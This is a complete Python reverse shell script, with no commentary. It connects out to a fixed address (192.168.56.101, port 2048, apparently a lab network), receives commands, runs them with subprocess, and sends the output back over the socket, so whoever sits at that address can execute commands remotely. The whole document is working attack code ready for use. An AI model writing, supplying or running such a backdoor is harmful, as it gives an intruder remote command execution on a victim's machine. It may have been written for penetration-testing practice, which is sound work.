#!/usr/bin/python
import socket
import subprocess, os
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.101', 2048))
    while True:
        data = ""
        cmd = s.recv(2048)
        if cmd.startswith('cd '):
            try:
                os.chdir(cmd.split(' ')[1])
                if cmd.endswith('cd'):
                    os.chdir('..')
            except:
                data = "Error changing directory"
            data = os.getcwd()

        elif cmd == 'fffff':
            data = 'garbage_data'
        else:
            try:
                p = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE, stderr = subprocess.PIPE)
                output, err = p.communicate()
                data = output + "\n" + err
            except:
                data = "Error while executing the command"
        s.send(data)

if __name__ == '__main__':
    main()
